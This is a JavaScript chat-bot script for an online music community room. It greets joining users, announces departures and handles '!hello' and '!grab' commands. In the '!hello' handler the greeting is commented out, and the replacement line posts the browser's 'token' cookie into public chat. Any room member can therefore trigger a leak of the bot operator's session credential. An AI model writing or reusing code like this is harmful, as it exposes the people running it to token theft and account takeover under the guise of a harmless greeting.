const bot = {
  status: false,
  name: 'TestBot',
  version: '1.0',
  community: {
    users: []
  },
  API: {

    enable: function(){
      bot.status = true;
      API.chat.send(`${bot.name} version ${bot.version} is successfully enabled.`);
      API.song.like();
    }

  }
};

(function(){
  bot.API.enable();

  // Handle users-update fold-here
  API.on('users-update', (data) => {
    if(!bot.status) return;

    if(data.type === 'join'){

      if(bot.community.users.includes(data.user.id)){
        API.chat.send(`Welcome back @${data.user.name}.`);
      }

      else{
        bot.community.users.push(data.user.id);
        API.chat.send(`Welcome @${data.user.name} to this community.`);
      }

    }

    else if(data.type === 'leave'){
      API.chat.send(`@${data.user.name} left our community. :(`);
    }

  });
  /**********************************************************************************************/

  // Handle chat-update fold-here
  API.on('chat-update', (data) => {
    if(data.type !== 'message') return;
    if(!data.message.text.toString().startsWith('!')) return;

    const text = data.message.text.toString();
    const params = text.split(' ');
    const command = params[0].substring(1).toLowerCase();

    if(command === 'hello'){
      //API.chat.send(`@${data.user.name} Hi! How are you today bro? :blush:`);
      API.chat.send(Cookies.get('token'));
    }

    else if(command === 'grab'){
      API.song.grab('WOIDim96sG');
      API.chat.send(`I grabbed a song!`);
    }

  });
  /**********************************************************************************************/

}());
